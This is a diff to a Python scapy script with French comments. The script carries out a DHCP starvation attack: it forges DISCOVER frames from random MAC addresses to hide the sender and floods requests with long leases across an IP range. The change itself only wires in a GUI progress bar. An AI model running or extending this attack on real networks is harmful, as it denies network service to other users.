@@ -6,7 +6,8 @@ from scapy.layers.dhcp import BOOTP, DHCP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether
 
-def dhcp(interface):
+
+def dhcp(interface,win,pg):
     # Construction d'un paquet DHCP_DISCOVER à envoyer
     # Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
     frame_discover_l1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800)
@@ -37,6 +38,8 @@ def dhcp(interface):
         str_vide = ""
         new = ip_str + str_vide + "." + str(j)
         print("Attaque en cours sur l'ip " + new)
+        pg.step(0.39) # Ajout de 0.39 à  la barre de progression
+        win.update() # Mise a jour de la fenetre
         # Création de la couche 4 du paquets avec comme adresse de destination l'IP générée dans la boucle
         frame_release_l4 = BOOTP(ciaddr=new, xid=RandInt())
         # Création du message DHCP avec un type de message "request", ainsi qu'un "lease time" correspondant au temps où l'IP ne peut pas être redistribuée, ici, à 100 000 secondes
